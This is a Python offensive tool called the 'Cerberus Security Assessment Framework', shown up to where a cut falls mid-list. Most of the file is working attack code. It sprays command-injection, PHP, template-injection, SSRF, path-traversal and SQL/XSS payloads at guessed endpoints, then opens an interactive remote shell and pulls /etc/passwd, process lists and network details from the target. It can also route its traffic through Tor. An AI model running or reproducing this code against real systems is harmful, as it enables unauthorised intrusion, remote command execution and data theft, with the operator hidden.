#!/usr/bin/env python3
"""
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
     Cerberus Security Assessment Framework v5.1 - Enhanced
           by: ek0ms savi0r
"""

import argparse
import sys
import time
import requests
import socket
import subprocess
import json
import base64
import random
import csv
import zipfile
from datetime import datetime
from typing import Dict, List, Tuple
import os
import urllib3
import threading
import readline
import concurrent.futures

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import socks
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

class IntelligentRCEExploiter:
    """Smart RCE exploitation focusing on found endpoints"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.found_endpoints = []
        
    def exploit_found_endpoint(self, endpoint: str, command: str) -> str:
        """Intelligently exploit discovered RCE endpoints"""
        print(f"{Colors.GREEN}[+] EXPLOITING FOUND ENDPOINT: {endpoint}{Colors.END}")
        
        url = f"http://{self.target}:{self.port}{endpoint}"
        
        # Try different exploitation techniques for this specific endpoint
        exploitation_methods = [
            self._exploit_json_rpc,
            self._exploit_rest_api,
            self._exploit_command_injection,
            self._exploit_direct_execution
        ]
        
        for method in exploitation_methods:
            result = method(url, command)
            if result and "Command execution failed" not in result:
                return result
        
        return f"{Colors.RED}[-] Endpoint exploitation failed: {endpoint}{Colors.END}"
    
    def _exploit_json_rpc(self, url: str, command: str) -> str:
        """Exploit JSON-RPC style endpoints"""
        payloads = [
            {"command": command, "cmd": command, "exec": command},
            {"query": command, "input": command, "system": command},
            {"data": {"command": command}, "execute": True},
            {"method": "exec", "params": [command]},
            {"cmd": command, "action": "execute"}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    url,
                    json=payload,
                    timeout=5,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                if self._is_successful_execution(response, command):
                    return response.text
            except:
                continue
        return None
    
    def _exploit_rest_api(self, url: str, command: str) -> str:
        """Exploit REST API endpoints"""
        # Try different HTTP methods
        methods = ['POST', 'GET', 'PUT']
        
        for method in methods:
            try:
                if method == 'POST':
                    data_payloads = {
                        'command': command, 'cmd': command, 'exec': command,
                        'query': command, 'input': command, 'system': command
                    }
                    for param, value in data_payloads.items():
                        response = self.session.post(
                            url,
                            data={param: value},
                            timeout=5,
                            verify=False
                        )
                        if self._is_successful_execution(response, command):
                            return response.text
                
                elif method == 'GET':
                    response = self.session.get(
                        f"{url}?command={command}",
                        timeout=5,
                        verify=False
                    )
                    if self._is_successful_execution(response, command):
                        return response.text
                        
            except:
                continue
        return None
    
    def _exploit_direct_execution(self, url: str, command: str) -> str:
        """Direct command execution attempts"""
        direct_payloads = [
            f"127.0.0.1; {command}",
            f"localhost | {command}",
            f"$({{{command}}})",
            f"`{command}`"
        ]
        
        for payload in direct_payloads:
            try:
                response = self.session.post(
                    url,
                    data={'ip': payload, 'host': payload, 'target': payload},
                    timeout=5,
                    verify=False
                )
                if self._is_successful_execution(response, command):
                    return response.text
            except:
                continue
        return None
    
    def _is_successful_execution(self, response, command: str) -> bool:
        """Enhanced execution success detection"""
        if response.status_code != 200:
            return False
            
        content = response.text.lower()
        
        # Strong indicators of success
        success_indicators = [
            'root', 'user', 'admin', 'uid=', 'gid=', '/home/', '/root/',
            'linux', 'windows', 'system32', 'etc/passwd'
        ]
        
        # Command-specific validation
        if 'whoami' in command and any(indicator in content for indicator in ['root', 'user', 'admin']):
            return True
        if 'id' in command and any(indicator in content for indicator in ['uid=', 'gid=']):
            return True
        if 'pwd' in command and '/' in content and len(content) < 100:
            return True
        if 'echo cerberus_test' in command and 'cerberus_test' in content:
            return True
            
        return any(indicator in content for indicator in success_indicators)

# =============================================================================
# NEW: Service-Specific Exploiter Class
# =============================================================================

class ServiceSpecificExploiter:
    """Service-specific exploitation based on port scanning"""
    
    def __init__(self, target: str):
        self.target = target
        
    def exploit_service(self, port: int, service: str):
        """Exploit specific services based on port"""
        print(f"{Colors.CYAN}[>] Exploiting {service} on port {port}{Colors.END}")
        
        if port == 21:
            return self._exploit_ftp()
        elif port == 22:
            return self._exploit_ssh()
        elif port == 23:
            return self._exploit_telnet()
        elif port == 53:
            return self._exploit_dns()
        elif port == 80 or port == 443:
            return self._exploit_web(port)
        elif port == 445:
            return self._exploit_smb()
        elif port == 3389:
            return self._exploit_rdp()
        else:
            return self._exploit_generic(port, service)
    
    def _exploit_web(self, port: int):
        """Enhanced web service exploitation"""
        protocols = ['http', 'https'] if port == 443 else ['http']
        
        for protocol in protocols:
            base_url = f"{protocol}://{self.target}:{port}"
            
            # Test common web vulnerabilities
            vulnerabilities = [
                self._test_directory_traversal(base_url),
                self._test_file_inclusion(base_url),
                self._test_backup_files(base_url),
                self._test_admin_panels(base_url)
            ]
            
            if any(vulnerabilities):
                return True
        return False
    
    def _test_directory_traversal(self, base_url: str) -> bool:
        """Test for directory traversal vulnerabilities"""
        payloads = [
            "../../../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../".join([""]*10) + "etc/passwd"
        ]
        
        test_endpoints = ['/files', '/download', '/view', '/image', '/load']
        
        for endpoint in test_endpoints:
            for payload in payloads:
                try:
                    url = f"{base_url}{endpoint}?file={payload}"
                    response = requests.get(url, timeout=3, verify=False)
                    if "root:" in response.text and "bin/" in response.text:
                        print(f"{Colors.GREEN}[+] Directory traversal found: {url}{Colors.END}")
                        return True
                except:
                    continue
        return False
    
    def _test_file_inclusion(self, base_url: str) -> bool:
        """Test for file inclusion vulnerabilities"""
        payloads = [
            "../../../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        test_endpoints = ['/include', '/load', '/view', '/file']
        
        for endpoint in test_endpoints:
            for payload in payloads:
                try:
                    url = f"{base_url}{endpoint}?page={payload}"
                    response = requests.get(url, timeout=3, verify=False)
                    if "root:" in response.text or "PD9waHA" in response.text:
                        print(f"{Colors.GREEN}[+] File inclusion found: {url}{Colors.END}")
                        return True
                except:
                    continue
        return False
    
    def _test_backup_files(self, base_url: str) -> bool:
        """Test for backup files"""
        backup_files = [
            '/.git/config', '/backup.zip', '/database.sql', 
            '/wp-config.php.bak', '/.env.bak', '/config.bak'
        ]
        
        for backup_file in backup_files:
            try:
                url = f"{base_url}{backup_file}"
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"{Colors.GREEN}[+] Backup file found: {url}{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _test_admin_panels(self, base_url: str) -> bool:
        """Test for admin panels"""
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/login', 
            '/dashboard', '/control', '/manager'
        ]
        
        for path in admin_paths:
            try:
                url = f"{base_url}{path}"
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['login', 'admin', 'password']):
                    print(f"{Colors.YELLOW}[!] Admin panel found: {url}{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _exploit_ftp(self):
        """FTP service exploitation"""
        try:
            # Test anonymous login
            from ftplib import FTP
            ftp = FTP(self.target)
            ftp.login()  # Anonymous
            print(f"{Colors.GREEN}[+] FTP anonymous login allowed{Colors.END}")
            ftp.quit()
            return True
        except:
            print(f"{Colors.RED}[-] FTP anonymous login failed{Colors.END}")
            return False
    
    def _exploit_ssh(self):
        """SSH service exploitation"""
        # Placeholder for SSH attacks
        print(f"{Colors.YELLOW}[!] SSH service detected - manual credential testing recommended{Colors.END}")
        return False
    
    def _exploit_telnet(self):
        """Telnet service exploitation"""
        print(f"{Colors.YELLOW}[!] Telnet service detected - cleartext protocol{Colors.END}")
        return False
    
    def _exploit_dns(self):
        """DNS service exploitation attempts"""
        try:
            # DNS cache poisoning test
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.target]
            try:
                resolver.query('test.cerberus.local', 'A')
                print(f"{Colors.YELLOW}[!] DNS service accepting queries{Colors.END}")
                return True
            except:
                pass
        except ImportError:
            pass
        print(f"{Colors.YELLOW}[!] DNS service detected - zone transfer attacks possible{Colors.END}")
        return False
    
    def _exploit_smb(self):
        """SMB service exploitation"""
        print(f"{Colors.YELLOW}[!] SMB service detected - check for EternalBlue and anonymous shares{Colors.END}")
        return False
    
    def _exploit_rdp(self):
        """RDP service exploitation"""
        print(f"{Colors.YELLOW}[!] RDP service detected - check for BlueKeep and weak credentials{Colors.END}")
        return False
    
    def _exploit_generic(self, port: int, service: str):
        """Generic service exploitation"""
        print(f"{Colors.YELLOW}[!] {service} on port {port} - manual investigation recommended{Colors.END}")
        return False

# =============================================================================
# EXISTING CLASSES (Enhanced)
# =============================================================================

class TorManager:
    """Manage TOR proxy connections with improved detection"""
    
    def __init__(self, tor_port: int = 9050, control_port: int = 9051):
        self.tor_port = tor_port
        self.control_port = control_port
        self.original_socket = socket.socket
        
    def enable_tor(self):
        """Route traffic through TOR with multiple verification methods"""
        if not TOR_AVAILABLE:
            print(f"{Colors.RED}[-] PySocks not installed. Install with: pip install PySocks{Colors.END}")
            return False
            
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            socket.socket = socks.socksocket
            
            print(f"{Colors.YELLOW}[*] Testing TOR connection...{Colors.END}")
            
            if self._test_tor_socket():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (socket test){Colors.END}")
                return True
                
            if self._test_tor_http():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (HTTP test){Colors.END}")
                return True
                
            if self._check_tor_process():
                print(f"{Colors.YELLOW}[!] TOR process is running but connection test failed{Colors.END}")
                return True
                
            print(f"{Colors.RED}[-] All TOR connection tests failed{Colors.END}")
            self.disable_tor()
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] TOR setup failed: {str(e)}{Colors.END}")
            self.disable_tor()
            return False
    
    def _test_tor_socket(self):
        """Test TOR with direct socket connection"""
        try:
            test_socket = socks.socksocket()
            test_socket.settimeout(10)
            test_socket.connect(("check.torproject.org", 80))
            test_socket.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
            response = test_socket.recv(1024).decode()
            test_socket.close()
            
            if "Congratulations" in response:
                return True
        except:
            pass
        return False
    
    def _test_tor_http(self):
        """Test TOR with HTTP requests"""
        try:
            session = requests.Session()
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{self.tor_port}',
                'https': f'socks5h://127.0.0.1:{self.tor_port}'
            }
            
            tor_check_urls = [
                "http://check.torproject.org/",
                "http://ipinfo.io/json",
                "http://httpbin.org/ip"
            ]
            
            for url in tor_check_urls:
                try:
                    response = session.get(url, timeout=10)
                    if "Congratulations" in response.text:
                        print(f"{Colors.GREEN}[+] TOR verified via {url}{Colors.END}")
                        return True
                    elif response.status_code == 200:
                        print(f"{Colors.YELLOW}[*] TOR connection working (via {url}){Colors.END}")
                        return True
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[-] HTTP TOR test failed: {str(e)}{Colors.END}")
            
        return False
    
    def _check_tor_process(self):
        """Check if TOR process is running"""
        try:
            result = subprocess.run(['pgrep', 'tor'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Colors.YELLOW}[*] TOR process is running (PID: {result.stdout.strip()}){Colors.END}")
                return True
                
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            if f":{self.tor_port}" in result.stdout:
                print(f"{Colors.YELLOW}[*] TOR port {self.tor_port} is listening{Colors.END}")
                return True
                
        except Exception as e:
            print(f"{Colors.RED}[-] Process check failed: {str(e)}{Colors.END}")
            
        return False
    
    def disable_tor(self):
        """Restore normal socket operations"""
        if TOR_AVAILABLE:
            socks.set_default_proxy()
            socket.socket = self.original_socket
        print(f"{Colors.YELLOW}[*] TOR proxy disabled{Colors.END}")

class NetworkScanner:
    """Enhanced network scanning operations"""
    
    @staticmethod
    def port_scan(target: str, port: int) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except Exception as e:
            return False

    @staticmethod
    def enhanced_service_detection(target: str, port: int) -> str:
        """Enhanced service detection with banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
        
            probes = [
                b"GET / HTTP/1.0\r\n\r\n",
                b"HEAD / HTTP/1.0\r\n\r\n", 
                b"OPTIONS / HTTP/1.0\r\n\r\n"
            ]
        
            for probe in probes:
                try:
                    sock.send(probe)
                    response = sock.recv(2048).decode('utf-8', errors='ignore')
                
                    if "Apache" in response:
                        sock.close()
                        return "Apache HTTP Server"
                    elif "nginx" in response:
                        sock.close()
                        return "nginx"
                    elif "IIS" in response:
                        sock.close()
                        return "Microsoft IIS"
                    elif "Tomcat" in response:
                        sock.close()
                        return "Apache Tomcat"
                except:
                    continue
                
            sock.close()
            return "HTTP Service"
        
        except Exception as e:
            return f"Service detection failed: {str(e)}"

    @staticmethod
    def quick_port_scan(target: str, ports: List[int]) -> Dict[int, bool]:
        """Quickly scan multiple ports"""
        open_ports = {}
        
        def scan_port(port):
            return port, NetworkScanner.port_scan(target, port)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan_port, port) for port in ports]
            for future in concurrent.futures.as_completed(futures):
                port, is_open = future.result()
                open_ports[port] = is_open
        
        return open_ports

# =============================================================================
# ENHANCED: CommandExecutionEngine with Intelligent RCE
# =============================================================================

class CommandExecutionEngine:
    """ENHANCED command execution with intelligent RCE exploitation"""
    
    def __init__(self, target: str, port: int, found_endpoints: list = None):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.session.timeout = 5
        self.working_method = None
        self.working_url = None
        self.working_param = None
        self.found_endpoints = found_endpoints or []
        self.rce_exploiter = IntelligentRCEExploiter(target, port)
        
    def execute_command(self, command: str) -> str:
        """ACTUALLY EXECUTE COMMANDS using intelligent exploitation"""
        
        # PRIORITY 1: Use found RCE endpoints FIRST
        for endpoint in self.found_endpoints:
            result = self.rce_exploiter.exploit_found_endpoint(endpoint, command)
            if result and "Command execution failed" not in result:
                return result
        
        # PRIORITY 2: If we already found a working method, use it
        if self.working_method and self.working_url:
            result = self._execute_with_known_method(command)
            if "Command execution failed" not in result:
                return result
        
        # PRIORITY 3: Traditional methods (fallback)
        return self._execute_traditional_methods(command)
    
    def _execute_traditional_methods(self, command: str) -> str:
        """Execute using traditional exploitation methods"""
        methods = [
            ("Command Injection", self._get_injection_urls(), self._generate_injection_payloads),
            ("PHP Injection", self._get_php_urls(), self._generate_php_payloads),
            ("Template Injection", self._get_template_urls(), self._generate_template_payloads),
            ("SSRF", self._get_ssrf_urls(), self._generate_ssrf_payloads),
            ("File Inclusion", self._get_file_inclusion_urls(), self._generate_file_inclusion_payloads)
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_method = {
                executor.submit(self._try_execution_method, method_name, payload_generator(command), test_urls, command): 
                method_name for method_name, test_urls, payload_generator in methods
            }
            
            for future in concurrent.futures.as_completed(future_to_method):
                result = future.result()
                if result and "Command execution failed" not in result:
                    return result
        
        return f"{Colors.RED}[-] Command execution failed - no working method found{Colors.END}"
    
    def _execute_with_known_method(self, command: str) -> str:
        """Execute command using previously discovered working method"""
        try:
            if self.working_method == "Command Injection":
                payloads = self._generate_injection_payloads(command)
            elif self.working_method == "PHP Injection":
                payloads = self._generate_php_payloads(command)
            elif self.working_method == "Template Injection":
                payloads = self._generate_template_payloads(command)
            else:
                payloads = self._generate_injection_payloads(command)
            
            for payload in payloads:
                try:
                    if self.working_param:
                        response = self.session.post(
                            self.working_url,
                            data={self.working_param: payload},
                            timeout=3,
                            verify=False,
                            headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                        )
                    else:
                        response = self.session.get(
                            self.working_url,
                            timeout=3,
                            verify=False,
                            headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                        )
                    
                    if self._is_valid_response(response, command):
                        return response.text
                except:
                    continue
        except Exception as e:
            pass
        
        return f"{Colors.RED}[-] Previously working method failed{Colors.END}"
    
    def _generate_injection_payloads(self, command: str):
        return [
            f";{command};",
            f"|{command}",
            f"`{command}`",
            f"$({command})",
            f"||{command}",
            f"&&{command}",
            f"\n{command}\n",
            f"127.0.0.1;{command}",
            f"localhost|{command}",
            f"$({{{command}}})"
        ]
    
    def _generate_php_payloads(self, command: str):
        encoded_command = base64.b64encode(command.encode()).decode()
        return [
            f"system('{command}');",
            f"exec('{command}');",
            f"shell_exec('{command}');",
            f"passthru('{command}');",
            f"`{command}`",
            f"<?php system('{command}'); ?>",
            f"<?php echo shell_exec('{command}'); ?>",
            f"<?php system(base64_decode('{encoded_command}')); ?>"
        ]
    
    def _generate_template_payloads(self, command: str):
        return [
            f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{command}',shell=True,stdout=-1).communicate()[0].strip()}}}}",
            f"{{% import os %}}{{% os.system('{command}') %}}",
            f"${{7*7}}",
            f"#{{7*7}}",
            f"@(7+7)"
        ]
    
    def _generate_ssrf_payloads(self, command: str):
        return [
            f"http://localhost:8000/$({{{command}}})",
            f"file:///etc/passwd$({command})",
            f"gopher://127.0.0.1:22/{command}"
        ]
    
    def _generate_file_inclusion_payloads(self, command: str):
        return [
            f"../../../../../../../../etc/passwd$({command})",
            f"....//....//....//....//etc/passwd$({command})",
            f"php://filter/convert.base64-encode/resource=index.php$({command})"
        ]
    
    def _get_injection_urls(self):
        return [
            f"http://{self.target}:{self.port}/ping",
            f"http://{self.target}:{self.port}/api/ping",
            f"http://{self.target}:{self.port}/admin/ping",
            f"http://{self.target}:{self.port}/cmd",
            f"http://{self.target}:{self.port}/exec",
            f"http://{self.target}:{self.port}/system",
            f"http://{self.target}:{self.port}/run",
            f"http://{self.target}:{self.port}/shell",
            f"http://{self.target}:{self.port}/command",
            f"http://{self.target}:{self.port}/api/execute"
        ]
    
    def _get_php_urls(self):
        return [
            f"http://{self.target}:{self.port}/index.php",
            f"http://{self.target}:{self.port}/admin.php",
            f"http://{self.target}:{self.port}/api.php",
            f"http://{self.target}:{self.port}/test.php",
            f"http://{self.target}:{self.port}/debug.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php"
        ]
    
    def _get_template_urls(self):
        return [
            f"http://{self.target}:{self.port}/",
            f"http://{self.target}:{self.port}/admin",
            f"http://{self.target}:{self.port}/api",
            f"http://{self.target}:{self.port}/user",
            f"http://{self.target}:{self.port}/profile",
            f"http://{self.target}:{self.port}/dashboard"
        ]
    
    def _get_ssrf_urls(self):
        return [
            f"http://{self.target}:{self.port}/fetch",
            f"http://{self.target}:{self.port}/proxy",
            f"http://{self.target}:{self.port}/url",
            f"http://{self.target}:{self.port}/webhook",
            f"http://{self.target}:{self.port}/request"
        ]
    
    def _get_file_inclusion_urls(self):
        return [
            f"http://{self.target}:{self.port}/file",
            f"http://{self.target}:{self.port}/view",
            f"http://{self.target}:{self.port}/load",
            f"http://{self.target}:{self.port}/include",
            f"http://{self.target}:{self.port}/template"
        ]
    
    def _try_execution_method(self, method_name: str, payloads: list, test_urls: list, original_command: str) -> str:
        print(f"{Colors.CYAN}[>] Trying {method_name}...{Colors.END}")
        
        for url in test_urls:
            for payload in payloads[:3]:  # Limit payloads to prevent hanging
                try:
                    # Test with POST data
                    data_payloads = {
                        'ip': f"127.0.0.1{payload}",
                        'host': f"localhost{payload}",
                        'cmd': payload,
                        'command': payload,
                        'exec': payload,
                        'system': payload,
                        'query': payload,
                        'input': payload,
                        'data': payload,
                        'username': payload,
                        'password': payload,
                        'file': payload,
                        'path': payload,
                        'url': payload,
                        'page': payload,
                        'template': payload
                    }
                    
                    for param_name, param_value in data_payloads.items():
                        try:
                            response = self.session.post(
                                url,
                                data={param_name: param_value},
                                timeout=2,  # Shorter timeout
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {url} param: {param_name}{Colors.END}")
                                # Store working method for future use
                                self.working_method = method_name
                                self.working_url = url
                                self.working_param = param_name
                                return response.text
                        except:
                            pass
                    
                    # Test with GET parameters
                    for param_name, param_value in data_payloads.items():
                        try:
                            test_url = f"{url}?{param_name}={requests.utils.quote(param_value)}"
                            response = self.session.get(
                                test_url, 
                                timeout=2,  # Shorter timeout
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {test_url}{Colors.END}")
                                self.working_method = method_name
                                self.working_url = url
                                self.working_param = param_name
                                return response.text
                        except:
                            pass
                            
                except Exception as e:
                    continue
        
        return None
    
    def _is_valid_response(self, response, original_command: str) -> bool:
        if response.status_code != 200:
            return False
        
        content = response.text
        
        # Check for common error pages
        error_indicators = ['error', 'not found', '404', '500', 'forbidden', 'internal server error']
        if any(indicator in content.lower() for indicator in error_indicators):
            return False
        
        # Check if it's likely HTML page (not command output)
        if any(tag in content.lower() for tag in ['<html', '<!doctype', '<head>', '<body>']):
            return False
        
        # Command-specific validation
        if original_command:
            if 'whoami' in original_command and ('root' in content or 'user' in content or 'admin' in content):
                return True
            if 'id' in original_command and ('uid=' in content or 'gid=' in content):
                return True
            if 'pwd' in original_command and ('/' in content and len(content) < 100):
                return True
            if 'echo CERBERUS_TEST' in original_command and 'CERBERUS_TEST' in content:
                return True
            if 'uname' in original_command and ('Linux' in content or 'Windows' in content):
                return True
        
        # Generic validation
        return len(content) > 0 and len(content) < 1000 and not content.strip().startswith('<!')

# =============================================================================
# ENHANCED: RealShellManager with Intelligent RCE
# =============================================================================

class RealShellManager:
    """ENHANCED shell manager with intelligent command execution"""
    
    def __init__(self, target: str, port: int, report_manager, found_endpoints: list = None):
        self.target = target
        self.port = port
        self.report_manager = report_manager
        self.execution_engine = CommandExecutionEngine(target, port, found_endpoints)
        self.has_real_access = False
        self.current_access_level = "unknown"
        
    def test_command_execution(self) -> bool:
        """ACTUALLY test and establish command execution with intelligent RCE"""
        print(f"{Colors.CYAN}[>] Establishing REAL command execution...{Colors.END}")
        
        test_commands = [
            "whoami",
            "id", 
            "echo CERBERUS_TEST",
            "pwd",
            "uname -a"
        ]
        
        for cmd in test_commands:
            print(f"{Colors.CYAN}[>] Testing: {cmd}{Colors.END}")
            result = self.execution_engine.execute_command(cmd)
            
            if (result and 
                "Command execution failed" not in result and
                not any(error in result for error in ['Error', 'Not Found', '404']) and
                len(result.strip()) > 0):
                
                print(f"{Colors.GREEN}[+] Command execution VERIFIED: {result.strip()}{Colors.END}")
                
                # Determine access level
                if 'root' in result.lower():
                    self.current_access_level = "root"
                elif 'admin' in result.lower():
                    self.current_access_level = "admin"
                else:
                    self.current_access_level = "user"
                
                self.has_real_access = True
                return True
        
        print(f"{Colors.RED}[-] Could not establish real command execution{Colors.END}")
        self.has_real_access = False
        return False
    
    def execute_real_command(self, command: str) -> str:
        """Execute commands with REAL capabilities"""
        if not self.has_real_access:
            return f"{Colors.RED}[-] No command execution established{Colors.END}"
        
        return self.execution_engine.execute_command(command)
    
    def interactive_shell(self):
        """REAL interactive shell"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] Establish command execution first!{Colors.END}")
            return
        
        print(f"\n{Colors.GREEN}[+] Starting REAL interactive shell{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'exit' to return to menu{Colors.END}")
        
        while True:
            try:
                cmd = input(f"{Colors.RED}shell@{self.target}:{self.port}$ {Colors.END}").strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                elif cmd.lower() == '':
                    continue
                
                result = self.execute_real_command(cmd)
                print(result)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
    
    def extract_real_data(self) -> dict:
        """Extract REAL data from target"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] No command execution capability{Colors.END}")
            return {}
        
        print(f"{Colors.CYAN}[>] Extracting real data from target...{Colors.END}")
        
        real_data = {}
        
        # System information
        system_commands = {
            "/etc/passwd": "cat /etc/passwd",
            "/etc/hosts": "cat /etc/hosts", 
            "/proc/version": "cat /proc/version",
            "/etc/issue": "cat /etc/issue",
            "/etc/os-release": "cat /etc/os-release",
            "network_info": "ifconfig || ip addr",
            "processes": "ps aux",
            "users": "whoami && id"
        }
        
        for file_path, command in system_commands.items():
            content = self.execute_real_command(command)
            
            if (content and 
                "Command execution failed" not in content and
                "FILE_NOT_FOUND" not in content and
                len(content) > 10):
                
                real_data[file_path] = content
                print(f"{Colors.GREEN}[+] Extracted: {file_path}{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Failed to extract: {file_path}{Colors.END}")
        
        return real_data

# =============================================================================
# ENHANCED: WebVulnerabilityScanner with Immediate Exploitation
# =============================================================================

class WebVulnerabilityScanner:
    """ENHANCED web vulnerability scanning with immediate exploitation"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.session.timeout = 2  # Shorter timeout
        self.rce_exploiter = IntelligentRCEExploiter(target, port)
        self.found_rce_endpoints = []
        
    def scan_sql_injection(self):
        """Fast SQL injection scanning"""
        print(f"{Colors.CYAN}[>] Scanning for SQL injection...{Colors.END}")
        
        test_urls = [
            f"http://{self.target}:{self.port}/login",
            f"http://{self.target}:{self.port}/search",
            f"http://{self.target}:{self.port}/products",
            f"http://{self.target}:{self.port}/user",
            f"http://{self.target}:{self.port}/id"
        ]
        
        sql_payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--"]
        
        for url in test_urls:
            for payload in sql_payloads:
                try:
                    # Test POST with timeout
                    response = self.session.post(url, data={
                        'username': payload,
                        'password': payload,
                        'query': payload,
                        'search': payload,
                        'id': payload
                    }, timeout=2)
                    
                    if any(indicator in response.text for indicator in ['mysql_fetch', 'ORA-', 'SQL syntax', 'PostgreSQL']):
                        print(f"{Colors.GREEN}[+] SQL Injection found at {url}{Colors.END}")
                        return True
                        
                except:
                    continue
                
                # Test GET with timeout
                try:
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=2)
                    if any(indicator in response.text for indicator in ['mysql_fetch', 'ORA-', 'SQL syntax']):
                        print(f"{Colors.GREEN}[+] SQL Injection found at {test_url}{Colors.END}")
                        return True
                except:
                    continue
        
        return False
    
    def scan_xss(self):
        """Fast XSS scanning"""
        print(f"{Colors.CYAN}[>] Scanning for XSS...{Colors.END}")
        
        xss_payload = "<script>alert('XSS')</script>"
        
        test_urls = [
            f"http://{self.target}:{self.port}/search",
            f"http://{self.target}:{self.port}/comment",
            f"http://{self.target}:{self.port}/contact"
        ]
        
        for url in test_urls:
            try:
                response = self.session.post(url, data={
                    'query': xss_payload,
                    'comment': xss_payload,
                    'message': xss_payload
                }, timeout=2)
                
                if xss_payload in response.text:
                    print(f"{Colors.GREEN}[+] XSS vulnerability found at {url}{Colors.END}")
                    return True
            except:
                continue
        
        return False

    def scan_rce_endpoints(self):
        """ENHANCED RCE endpoint scanning with immediate exploitation"""
        print(f"{Colors.CYAN}[>] Scanning for RCE endpoints...{Colors.END}")
        
        endpoints = [
            '/api/v1/execute', '/api/exec', '/api/command', '/api/rce',
            '/admin/exec', '/admin/cmd', '/admin/system',
            '/cmd', '/exec', '/system', '/run', '/shell',
            '/console', '/debug', '/terminal',
            '/cgi-bin/exec', '/cgi-bin/cmd',
            '/webshell', '/backdoor', '/phpbash'
